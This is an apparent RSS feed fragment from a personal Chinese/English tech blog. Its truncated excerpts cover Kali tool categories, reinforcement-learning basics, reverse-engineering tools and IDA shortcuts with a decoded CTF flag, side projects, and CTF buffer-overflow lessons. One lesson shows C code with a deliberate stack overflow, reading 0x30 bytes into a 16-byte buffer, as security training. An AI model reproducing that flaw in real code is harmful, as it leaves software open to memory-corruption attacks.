&lt;p>有關Kali的所有工具可以直接參考&lt;a href="https://www.researchgate.net/profile/Syed-Zain-Ul-Hassan-2/publication/369305777_Operating_Systems_for_Ethical_Hackers_-_A_Platform_Comparison_of_Kali_Linux_and_Parrot_OS/links/6414544c315dfb4cce89b6a3/Operating-Systems-for-Ethical-Hackers-A-Platform-Comparison-of-Kali-Linux-and-Parrot-OS.pdf">Operating Systems for Ethical Hackers - A Platform Comparison of Kali Linux and Parrot OS&lt;/a>
:::info
ul Hassan, S. Z., Muzaffar, Z., &amp;amp; Ahmad, S. Z. (2021). Operating Systems for Ethical Hackers-A Platform Comparison of Kali Linux and Parrot OS. International Journal, 10(3).
:::
裡面有詳細分類&lt;/p>
&lt;ul>
&lt;li>Information Gathering Tools(67)&lt;/li>
&lt;li>Vulnerability Analysis Tools(27)&lt;/li>
&lt;li>Exploitation Tools(21)&lt;/li>
&lt;li>Wireless Attacks Tools(54)&lt;/li>
&lt;li>Forensics Tools(23)&lt;/li>
&lt;li>Web Applications tools(43)&lt;/li>
&lt;li>Stress Testing tools(14)&lt;/li>
&lt;li>Sniffing &amp;amp; Spoofing Tools(33)&lt;/li>
&lt;li>Password Attacks Tools(39)&lt;/li>
&lt;li>Maintaining Access Tools(17)&lt;/li>
&lt;li>Reverse Engineering Tools(11)&lt;/li>
&lt;li>Reporting Tools(10)&lt;/li>
&lt;li>Hardware Hacking(6)&lt;/li>
&lt;li>Some Parrot OS in-built tools(20)&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;a href="https://www.exploit-db.com/google-hacking-database">Google Hacking&lt;/a>
:::spoiler Description&lt;/p></description></item><item><title>Reinforcement Learning</title><link>https://bernie6401.github.io/docs/terminology/reinforcement-learning/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/terminology/reinforcement-learning/</guid><description>&lt;h1 id="reinforcement-learning">
 Reinforcement Learning
 &lt;a class="anchor" href="#reinforcement-learning">#&lt;/a>
&lt;/h1>
&lt;h2 id="什麼是rl">
 什麼是RL
 &lt;a class="anchor" href="#%e4%bb%80%e9%ba%bc%e6%98%afrl">#&lt;/a>
&lt;/h2>
&lt;p>Reinforcement Learning（強化學習）是一種機器學習方法，通過試錯和獎勵機制來學習最佳行為。以下是強化學習的幾個應用面向，以及一些相關論文的參考：
遊戲：強化學習在遊戲領域中取得了顯著成就，例如AlphaGo和AlphaZero等。
機器人控制：用於控制機器人完成複雜任務，如行走、抓取物體等。
股票預測：應用於股票交易、投資策略等金融領域。
交通：用於優化交通信號控制、路線規劃等。&lt;/p>
&lt;h2 id="基本概念">
 基本概念
 &lt;a class="anchor" href="#%e5%9f%ba%e6%9c%ac%e6%a6%82%e5%bf%b5">#&lt;/a>
&lt;/h2>
&lt;p>強化學習（Reinforcement Learning）是一種機器學習方法，通過試錯和獎勵機制來學習最佳行為:&lt;/p>
&lt;ol>
&lt;li>&lt;strong>代理（Agent）&lt;/strong>：在環境中採取行動的實體，可以是機器人、軟件程序等。&lt;/li>
&lt;li>&lt;strong>環境（Environment）&lt;/strong>：代理所處的外部世界，提供狀態和反饋給代理。&lt;/li>
&lt;li>&lt;strong>狀態（State）&lt;/strong>：環境在某一時刻的描述，通常用$s$ 表示。&lt;/li>
&lt;li>&lt;strong>行動（Action）&lt;/strong>：代理在環境中採取的動作，通常用$a$ 表示。&lt;/li>
&lt;li>&lt;strong>獎勵（Reward）&lt;/strong>：環境對代理行動的反饋，用於引導學習，通常用$r$ 表示。&lt;/li>
&lt;li>&lt;strong>策略（Policy）&lt;/strong>：代理根據狀態選擇行動的方法，通常用$\pi(a|s)$ 表示。&lt;/li>
&lt;li>&lt;strong>價值函數（Value Function）&lt;/strong>：評估在某一狀態下遵循特定策略的預期累積獎勵，用於評估狀態的好壞。&lt;/li>
&lt;li>&lt;strong>Q函數（Q-Function）&lt;/strong>：評估在某一狀態下採取特定行動後遵循特定策略的預期累積獎勵。&lt;/li>
&lt;/ol>
&lt;h3 id="基本過程">
 基本過程
 &lt;a class="anchor" href="#%e5%9f%ba%e6%9c%ac%e9%81%8e%e7%a8%8b">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>&lt;strong>初始化&lt;/strong>：代理開始與環境交互。&lt;/li>
&lt;li>&lt;strong>觀察狀態&lt;/strong>：代理觀察環境的當前狀態。&lt;/li>
&lt;li>&lt;strong>選擇行動&lt;/strong>：根據策略選擇行動。&lt;/li>
&lt;li>&lt;strong>執行動作&lt;/strong>：在環境中執行動作。&lt;/li>
&lt;li>&lt;strong>獲得獎勵&lt;/strong>：環境給予獎勵。&lt;/li>
&lt;li>&lt;strong>更新知識&lt;/strong>：更新價值函數或Q函數，以改善未來的決策。&lt;/li>
&lt;/ol>
&lt;h3 id="常見算法">
 常見算法
 &lt;a class="anchor" href="#%e5%b8%b8%e8%a6%8b%e7%ae%97%e6%b3%95">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>Q-learning&lt;/strong>：使用Q函數學習最佳行動。&lt;/li>
&lt;li>&lt;strong>SARSA&lt;/strong>：使用價值函數學習最佳行動。&lt;/li>
&lt;li>&lt;strong>Deep Q-Networks (DQN)&lt;/strong>：使用深度神經網絡來近似Q函數。&lt;/li>
&lt;li>&lt;strong>Policy Gradient Methods&lt;/strong>：直接學習策略而非價值函數。&lt;/li>
&lt;/ul>
&lt;h2 id="value-function-vs-q-function">
 Value Function VS Q-Function
 &lt;a class="anchor" href="#value-function-vs-q-function">#&lt;/a>
&lt;/h2>
&lt;p>在強化學習（Reinforcement Learning, RL）中，&lt;strong>Value Function（價值函數）&lt;/strong> 和 &lt;strong>Q-Function（Q 值函數）&lt;/strong> 都是用來評估策略 $\pi$ 的好壞，但它們的側重點不同。&lt;/p>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>&lt;strong>函數&lt;/strong>&lt;/th>
 &lt;th>&lt;strong>定義&lt;/strong>&lt;/th>
 &lt;th>&lt;strong>描述&lt;/strong>&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>&lt;strong>State Value Function（狀態價值函數）$V(s)$&lt;/strong>&lt;/td>
 &lt;td>$V^\pi(s) = \mathbb{E} \left[ \sum_{t=0}^{\infty} \gamma^t R_t \mid S_0 = s, \pi \right]$&lt;/td>
 &lt;td>表示 &lt;strong>在狀態 $s$ 下，根據策略 $\pi$ 所能期望獲得的累積回報&lt;/strong>。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;strong>Action-Value Function（行動價值函數）$Q(s, a)$&lt;/strong>&lt;/td>
 &lt;td>$Q^\pi(s, a) = \mathbb{E} \left[ \sum_{t=0}^{\infty} \gamma^t R_t \mid S_0 = s, A_0 = a, \pi \right]$&lt;/td>
 &lt;td>表示 &lt;strong>在狀態 $s$ 下執行動作 $a$，並按照策略 $\pi$ 行動後，所能期望獲得的累積回報&lt;/strong>。&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;ul>
&lt;li>
&lt;p>Value Function
$$
V^\pi(s) = \mathbb{E}&lt;em>\pi \left[ \sum&lt;/em>{t=0}^\infty \gamma^t r_t \mid s_0 = s \right]
$$&lt;/p></description></item><item><title>Reverse Overview</title><link>https://bernie6401.github.io/docs/tools/ctf/reverse-overview/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/ctf/reverse-overview/</guid><description>&lt;h1 id="reverse-overview">
 Reverse Overview
 &lt;a class="anchor" href="#reverse-overview">#&lt;/a>
&lt;/h1>
&lt;h2 id="tools">
 Tools
 &lt;a class="anchor" href="#tools">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Type&lt;/th>
 &lt;th>App&lt;/th>
 &lt;th>.NET&lt;/th>
 &lt;th>x86/x64&lt;/th>
 &lt;th>Packer&lt;/th>
 &lt;th>Python&lt;/th>
 &lt;th>C&lt;/th>
 &lt;th>General&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>Description&lt;/td>
 &lt;td>&lt;li> MobSF: Must run in python &lt;code>3.8&lt;/code>&lt;/li>&lt;li>ApkTool: Just follow the step in &lt;a href="https://apktool.org/docs/install/">install guide&lt;/a>&lt;/li>&lt;/td>
 &lt;td>To decompile C#(.NET)&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>指令：&lt;code>$ upx -d {filename}&lt;/code>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>一個可以把組語轉換成c pseudo code的線上工具&lt;/td>
 &lt;td>一個線上的decompiler，結合多種工具，只要上傳檔案(小於2MB)就可以呈現多種decompiler tools的結果&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Link&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10215522">MobSF&lt;/a>&lt;/br>&lt;a href="https://apktool.org/">ApkTools&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://github.com/dnSpy/dnSpy/releases">dnSpy&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://carlosrafaelgn.com.br/Asm86/">x86模擬器&lt;/a>&lt;/br>&lt;a href="https://defuse.ca/online-x86-assembler.htm#disassembly">x86/x64 assembler/disassembler&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://github.com/upx/upx/releases/tag/v4.0.2">UPX Packer&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://tool.lu/pyc/">Pyc disassemble&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://godbolt.org/">Compiler Explorer&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://dogbolt.org/">Decompiler Explorer&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="ida-常用快捷鍵">
 IDA 常用快捷鍵
 &lt;a class="anchor" href="#ida-%e5%b8%b8%e7%94%a8%e5%bf%ab%e6%8d%b7%e9%8d%b5">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://blog.30cm.tw/2018/01/ida.html">IDA Interface&lt;/a>&lt;/li>
&lt;li>型別
&lt;ul>
&lt;li>char(1 byte)&lt;/li>
&lt;li>WORD(2 bytes)&lt;/li>
&lt;li>DWORD(4 bytes)&lt;/li>
&lt;li>PDWORD(pointer of DWORD = DWORD *)&lt;/li>
&lt;li>若是DWORD *name，代表name這個變數是一個pointer而且指向的地方是一個DWORD&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Space: 在 Text View / Graph View 切換&lt;/li>
&lt;li>Tab: 在視窗之間切換&lt;/li>
&lt;li>;/Insert: 註解&lt;/li>
&lt;li>x: 秀出 Xrefs&lt;/li>
&lt;li>n: 改名&lt;/li>
&lt;li>y: 改型別&lt;/li>
&lt;li>h: 改表示方式 (dec / hex)&lt;/li>
&lt;li>u: 取消定義&lt;/li>
&lt;li>a: 當成字串&lt;/li>
&lt;li>c: 當成code&lt;/li>
&lt;li>p: 當成function&lt;/li>
&lt;li>t: set sizeof(XXX)；如果已經確定目前的constant就是某個變數的length，那可以直接按t讓他變成sizeof(那個變數)
舉例：如果已經確定目前的&lt;code>0x238&lt;/code>就是&lt;code>PROCESSENTRY32W&lt;/code>的size，就可以直接這樣用，會變得比較清楚
:::spoiler 結果
&lt;img src="https://hackmd.io/_uploads/S1nruHTza.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/rkjwuBTza.png" alt="" />
:::&lt;/li>
&lt;li>Shift+F1: show出Local Type視窗
:::spoiler Local Types Screenshot
&lt;img src="https://hackmd.io/_uploads/S1ikDa5_n.png" alt="" />
:::&lt;/li>
&lt;li>Shift+F12: 開啟Strings視窗
:::spoiler Strings Screenshot
&lt;img src="https://hackmd.io/_uploads/HybvLzo_2.png" alt="" />
:::&lt;/li>
&lt;li>對某一個數值按m: ENUM這個功能就是在替換一些常見的windows API參數，讓原本的純數字可以用文字表示，這樣比較好懂API的操作，逆向會更順暢(補充說明：IDA有收錄很多MSDN上的一些API，他每一個參數表示的文字，例如&lt;a href="https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants">這一篇&lt;/a>底下有顯示很多Constant/value的對應，而正常情況下IDA會顯示的是value，如果要把它換成Constant文字的表達式就可以用到ENUM這個功能)，又例如:
目前已經知道&lt;code>CreateToolhelp32Snapshot(2, 0);&lt;/code>中的2的意義是&lt;code>TH32CS_SNAPPROCESS&lt;/code>(可以參考&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot#parameters">MSDN&lt;/a>)，此時就可以直接按m之後再選擇&lt;code>TH32CS_SNAPPROCESS&lt;/code>
:::spoiler
&lt;img src="https://hackmd.io/_uploads/B1Rn5Q6G6.png" alt="" />
:::&lt;/li>
&lt;li>\: 不顯示/顯示資料型別&lt;/li>
&lt;li>Alt+M/Ctrl+M: 前者是註冊書籤，後者是察看並選擇標籤，可以快速跑到標示的地址&lt;/li>
&lt;li>Ctrl+E: 如果是分析DLL file，可能會有很多不同的entry point，利用這個shortcut可以顯示目前有幾個entry point，很方便
:::spoiler
&lt;img src="https://hackmd.io/_uploads/ryJw-C6Ga.png" alt="" />
:::&lt;/li>
&lt;li>如何把bytes變成字串:
&lt;ul>
&lt;li>可以直接Alt+A
:::spoiler&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>可以先把bytes的型別定義好(單獨的bytes變成array)，變成array有兩種方法，第一種是直接用&lt;code>Y&lt;/code>定義他的型別成&lt;code>int dword_2008[32]&lt;/code>，前面的int就看每一個字元是來決定，後面&lt;code>[32]&lt;/code>就代表有多少字元變成array；第二種方法就是直接按&lt;code>d&lt;/code>改變一個字元的型態變成int，然後在&lt;code>edit/Array&lt;/code>的地方可以叫出&lt;code>Convert to array&lt;/code>的視窗(如果前面沒有先用&lt;code>d&lt;/code>改變型態的話，他會以為所有字元都是一個byte，然後總共有128個字元這樣換算，但其實我們是總共32個字元，每一個字元是4個bytes，也就是int，這一點要特別注意)
&lt;img src="https://hackmd.io/_uploads/HJ3yvI-Ga.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/r1A_8LWMa.png" alt="" />&lt;/li>
&lt;li>接著就是在&lt;code>Option/String literals&lt;/code>視窗中設定用哪一個型態表示字串，這邊因為每一個字元都是4 bytes，也就是32 bits，所以選擇C-style
&lt;img src="https://hackmd.io/_uploads/SyQBP8Zfp.png" alt="" />
:::
:::spoiler 完整流程&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>.rodata:0000000000002008 unk_2008 db 46h ; F ; DATA XREF: main+8↑o
.rodata:0000000000002009 db 0
.rodata:000000000000200A db 0
.rodata:000000000000200B db 0
.rodata:000000000000200C db 4Ch ; L
.rodata:000000000000200D db 0
.rodata:000000000000200E db 0
.rodata:000000000000200F db 0
.rodata:0000000000002010 db 41h ; A
.rodata:0000000000002011 db 0
.rodata:0000000000002012 db 0
.rodata:0000000000002013 db 0
.rodata:0000000000002014 db 47h ; G
.rodata:0000000000002015 db 0
.rodata:0000000000002016 db 0
.rodata:0000000000002017 db 0
.rodata:0000000000002018 db 7Bh ; {
.rodata:0000000000002019 db 0
.rodata:000000000000201A db 0
.rodata:000000000000201B db 0
.rodata:000000000000201C db 68h ; h
.rodata:000000000000201D db 0
.rodata:000000000000201E db 0
.rodata:000000000000201F db 0
.rodata:0000000000002020 db 33h ; 3
.rodata:0000000000002021 db 0
.rodata:0000000000002022 db 0
.rodata:0000000000002023 db 0
.rodata:0000000000002024 db 31h ; 1
.rodata:0000000000002025 db 0
.rodata:0000000000002026 db 0
.rodata:0000000000002027 db 0
.rodata:0000000000002028 db 31h ; 1
.rodata:0000000000002029 db 0
.rodata:000000000000202A db 0
.rodata:000000000000202B db 0
.rodata:000000000000202C db 4Fh ; O
.rodata:000000000000202D db 0
.rodata:000000000000202E db 0
.rodata:000000000000202F db 0
.rodata:0000000000002030 db 5Fh ; _
.rodata:0000000000002031 db 0
.rodata:0000000000002032 db 0
.rodata:0000000000002033 db 0
.rodata:0000000000002034 db 72h ; r
.rodata:0000000000002035 db 0
.rodata:0000000000002036 db 0
.rodata:0000000000002037 db 0
.rodata:0000000000002038 db 65h ; e
.rodata:0000000000002039 db 0
.rodata:000000000000203A db 0
.rodata:000000000000203B db 0
.rodata:000000000000203C db 76h ; v
.rodata:000000000000203D db 0
.rodata:000000000000203E db 0
.rodata:000000000000203F db 0
.rodata:0000000000002040 db 65h ; e
.rodata:0000000000002041 db 0
.rodata:0000000000002042 db 0
.rodata:0000000000002043 db 0
.rodata:0000000000002044 db 72h ; r
.rodata:0000000000002045 db 0
.rodata:0000000000002046 db 0
.rodata:0000000000002047 db 0
.rodata:0000000000002048 db 73h ; s
.rodata:0000000000002049 db 0
.rodata:000000000000204A db 0
.rodata:000000000000204B db 0
.rodata:000000000000204C db 31h ; 1
.rodata:000000000000204D db 0
.rodata:000000000000204E db 0
.rodata:000000000000204F db 0
.rodata:0000000000002050 db 6Eh ; n
.rodata:0000000000002051 db 0
.rodata:0000000000002052 db 0
.rodata:0000000000002053 db 0
.rodata:0000000000002054 db 67h ; g
.rodata:0000000000002055 db 0
.rodata:0000000000002056 db 0
.rodata:0000000000002057 db 0
.rodata:0000000000002058 db 5Fh ; _
.rodata:0000000000002059 db 0
.rodata:000000000000205A db 0
.rodata:000000000000205B db 0
.rodata:000000000000205C db 33h ; 3
.rodata:000000000000205D db 0
.rodata:000000000000205E db 0
.rodata:000000000000205F db 0
.rodata:0000000000002060 db 6Eh ; n
.rodata:0000000000002061 db 0
.rodata:0000000000002062 db 0
.rodata:0000000000002063 db 0
.rodata:0000000000002064 db 67h ; g
.rodata:0000000000002065 db 0
.rodata:0000000000002066 db 0
.rodata:0000000000002067 db 0
.rodata:0000000000002068 db 69h ; i
.rodata:0000000000002069 db 0
.rodata:000000000000206A db 0
.rodata:000000000000206B db 0
.rodata:000000000000206C db 6Eh ; n
.rodata:000000000000206D db 0
.rodata:000000000000206E db 0
.rodata:000000000000206F db 0
.rodata:0000000000002070 db 65h ; e
.rodata:0000000000002071 db 0
.rodata:0000000000002072 db 0
.rodata:0000000000002073 db 0
.rodata:0000000000002074 db 65h ; e
.rodata:0000000000002075 db 0
.rodata:0000000000002076 db 0
.rodata:0000000000002077 db 0
.rodata:0000000000002078 db 72h ; r
.rodata:0000000000002079 db 0
.rodata:000000000000207A db 0
.rodata:000000000000207B db 0
.rodata:000000000000207C db 35h ; 5
.rodata:000000000000207D db 0
.rodata:000000000000207E db 0
.rodata:000000000000207F db 0
.rodata:0000000000002080 db 7Dh ; }
.rodata:0000000000002081 db 0
.rodata:0000000000002082 db 0
.rodata:0000000000002083 db 0
.rodata:0000000000002084 db 0
.rodata:0000000000002085 db 0
.rodata:0000000000002086 db 0
.rodata:0000000000002087 db 0
&lt;/code>&lt;/pre>$\downarrow$
&lt;pre tabindex="0">&lt;code>.rodata:0000000000002008 dword_2008 dd 46h, 4Ch, 41h, 47h, 7Bh, 68h, 33h, 2 dup(31h), 4Fh, 5Fh, 72h, 65h, 76h, 65h, 72h, 73h, 31h, 6Eh, 67h
.rodata:0000000000002008 ; DATA XREF: main+8↑o
.rodata:0000000000002008 dd 5Fh, 33h, 6Eh, 67h, 69h, 6Eh, 2 dup(65h), 72h, 35h, 7Dh, 0
&lt;/code>&lt;/pre>$\downarrow$
&lt;pre tabindex="0">&lt;code>.rodata:0000000000002008 text &amp;#34;UTF-32LE&amp;#34;, &amp;#39;FLAG{h311O_revers1ng_3ngineer5}&amp;#39;,0
&lt;/code>&lt;/pre>:::&lt;/li>
&lt;li>如何快速把bytes dump出來
:::spoiler
&lt;ol>
&lt;li>選擇要輸出的bytes
&lt;img src="https://hackmd.io/_uploads/Syc9UkTM6.png" alt="" />&lt;/li>
&lt;li>按Shift+E，跳出的視窗選擇想要的格式，再直接複製即可
&lt;img src="https://hackmd.io/_uploads/SJ7a8ypfT.png" alt="" />
:::&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>如果函式沒有return東西的話，可以右鍵該函示，選擇&lt;code>Remove return value&lt;/code>或是Shift+Del
:::spoiler
&lt;img src="https://hackmd.io/_uploads/HkRk3JpG6.png" alt="" />
:::&lt;/li>
&lt;li>如果function中的宣告很多，可以右鍵選擇&lt;code>Collapse declarations&lt;/code>
:::spoiler
&lt;img src="https://hackmd.io/_uploads/SkOXU4AMa.png" alt="" />
:::&lt;/li>
&lt;/ul>
&lt;h2 id="x64dbg-常用快捷鍵">
 x64dbg 常用快捷鍵
 &lt;a class="anchor" href="#x64dbg-%e5%b8%b8%e7%94%a8%e5%bf%ab%e6%8d%b7%e9%8d%b5">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>F2: 設定中斷點&lt;/li>
&lt;li>F9: 繼續執行&lt;/li>
&lt;li>F8: 步過&lt;/li>
&lt;li>F7: 步入&lt;/li>
&lt;li>Ctrl+F9: 執行到 ret&lt;/li>
&lt;li>==Ctrl+G==: goto&lt;/li>
&lt;li>==Space==: 修改組譯&lt;/li>
&lt;/ul>
&lt;h3 id="靜態分析">
 靜態分析
 &lt;a class="anchor" href="#%e9%9d%9c%e6%85%8b%e5%88%86%e6%9e%90">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>PEview&lt;/li>
&lt;li>PEViewer&lt;/li>
&lt;li>PE-bear&lt;/li>
&lt;/ul>
&lt;h3 id="動態分析">
 動態分析
 &lt;a class="anchor" href="#%e5%8b%95%e6%85%8b%e5%88%86%e6%9e%90">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>OllyDbg&lt;/li>
&lt;li>x64dbg&lt;/li>
&lt;li>IDA&lt;/li>
&lt;li>Ghidra&lt;/li>
&lt;li>Windbg&lt;/li>
&lt;li>PEtool&lt;/li>
&lt;/ul>
&lt;h3 id="process相關的操作與資訊">
 Process相關的操作與資訊
 &lt;a class="anchor" href="#process%e7%9b%b8%e9%97%9c%e7%9a%84%e6%93%8d%e4%bd%9c%e8%88%87%e8%b3%87%e8%a8%8a">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>Procexp &amp;amp; Process Hacker
好看版的工作管理員&lt;/li>
&lt;li>Procmon
監控程序行為
Registry
File system
Network
Process/Thread&lt;/li>
&lt;/ul>
&lt;h3 id="好用的解題工具">
 好用的解題工具
 &lt;a class="anchor" href="#%e5%a5%bd%e7%94%a8%e7%9a%84%e8%a7%a3%e9%a1%8c%e5%b7%a5%e5%85%b7">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>&lt;a href="https://docs.angr.io/en/latest/appendix/cheatsheet.html">angr - cheatsheet&lt;/a>: &lt;code>$ pip install angr claripy&lt;/code>&lt;/li>
&lt;li>z3: &lt;code>$ pip install z3-solver&lt;/code>&lt;/li>
&lt;/ul></description></item><item><title>side_project_lightbulb_control</title><link>https://bernie6401.github.io/docs/side-project/side_project_lightbulb_control/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/side-project/side_project_lightbulb_control/</guid><description>&lt;h1 id="side_project_lightbulb_control">
 side_project_lightbulb_control
 &lt;a class="anchor" href="#side_project_lightbulb_control">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-side-project-arduino">
 tags: &lt;code>Side Project&lt;/code> &lt;code>Arduino&lt;/code>
 &lt;a class="anchor" href="#tags-side-project-arduino">#&lt;/a>
&lt;/h6>
&lt;p>:::spoiler
[TOC]
:::&lt;/p>
&lt;h2 id="project-purpose">
 Project Purpose
 &lt;a class="anchor" href="#project-purpose">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>In order to deal with the inconvenient experiment on lightbulb of bathroom, I decided to write some code and implent the circuit. Specifically speaking about the inconvenient, I wish exhaust fan in bathroom can always work without switch control it. But unfortunately, it has connected with lightbulb circuit at the beginning, and the circuit hided in the wall that I can&amp;rsquo;t change the circuit directly.&lt;/li>
&lt;li>The original circuit diagram is as the bottom left and the revised circuit diagram v1 is as the bottom right
&lt;img src="./img/origin_circuit.png" alt="origin_circuit" style="zoom: 50%;" />&lt;img src="./img/rev_v1_circuit.png" alt="rev_v1_circuit" style="zoom: 50%;" />&lt;/li>
&lt;/ul>
&lt;h2 id="arduino-circuit-diagram">
 Arduino Circuit Diagram
 &lt;a class="anchor" href="#arduino-circuit-diagram">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>Version 1
&lt;img src="./img/arduino_circuit_diagram.png" alt="arduino_circuit_diagram" />&lt;/p></description></item><item><title>side_project_weibo_hot</title><link>https://bernie6401.github.io/docs/side-project/side_project_weibo_hot/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/side-project/side_project_weibo_hot/</guid><description>&lt;h1 id="side_project_weibo_hot">
 side_project_weibo_hot
 &lt;a class="anchor" href="#side_project_weibo_hot">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-side-project-browser-automation-selenium">
 tags: &lt;code>Side Project&lt;/code> &lt;code>Browser Automation&lt;/code> &lt;code>Selenium&lt;/code>
 &lt;a class="anchor" href="#tags-side-project-browser-automation-selenium">#&lt;/a>
&lt;/h6>
&lt;p>:::spoiler
[TOC]
:::&lt;/p>
&lt;h2 id="side-project-background">
 Side Project Background
 &lt;a class="anchor" href="#side-project-background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Inspired by Bilingual Podcast is the best podcast channel in Taiwan that introduces interesting news happening around the world. They said they had a problem that they can not get the hot news from Weibo immediately before Xi made it disappear. For instance, Shuai Peng(彭帥) and Zhang Gaoli(張高麗) event. So, I wrote a side project about an automatic web system that can refresh the web page and download it automatically and keep the data safe.&lt;/li>
&lt;/ul>
&lt;h2 id="installation">
 Installation
 &lt;a class="anchor" href="#installation">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>pip install pyautogui
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pip install selenium
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="some-set-up">
 Some Set-Up
 &lt;a class="anchor" href="#some-set-up">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Make sure your web driver is the latest version. You can download it here(&lt;a href="https://chromedriver.chromium.org/">https://chromedriver.chromium.org/&lt;/a>)&lt;/li>
&lt;li>Make sure your desktop is the idle one in your home that you&amp;rsquo;ll not use it for a while.&lt;/li>
&lt;li>Make sure your desktop language keyboard is for English.&lt;/li>
&lt;/ol>
&lt;h2 id="something-can-solve-in-the-future">
 Something can solve in the future
 &lt;a class="anchor" href="#something-can-solve-in-the-future">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>The content data you download may not be the same as the latest because I just verify the hot news title before downloading.(Solved, I refresh the news_list.txt every day and then the page with the same title will download again.)&lt;/p></description></item><item><title>Simple Buffer Overflow - 0x00</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x00/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x00/</guid><description>&lt;h1 id="simple-buffer-overflow---0x00">
 Simple Buffer Overflow - 0x00
 &lt;a class="anchor" href="#simple-buffer-overflow---0x00">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn">#&lt;/a>
&lt;/h6>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

int main()
{
 char buf[0x10];
 read(0, buf, 0x30); // It&amp;#39;ll read the value that you input and store in buf with length=0x30
 system(&amp;#34;pause&amp;#34;);
 return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Note that you can check &lt;a href="https://www.dotcpp.com/course/460">this page&lt;/a> to know more about &lt;code>read&lt;/code> function&lt;/li>
&lt;/ul>
&lt;h2 id="dynamic-analysis---x32dbg">
 Dynamic Analysis - &lt;code>x32dbg&lt;/code>
 &lt;a class="anchor" href="#dynamic-analysis---x32dbg">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>This is the original entry point of this program.
&lt;img src="https://imgur.com/DWOL9Hy.png" alt="" />&lt;/p></description></item><item><title>Simple Buffer Overflow - 0x01</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x01/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x01/</guid><description>&lt;h1 id="simple-buffer-overflow---0x01">
 Simple Buffer Overflow - 0x01
 &lt;a class="anchor" href="#simple-buffer-overflow---0x01">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn">#&lt;/a>
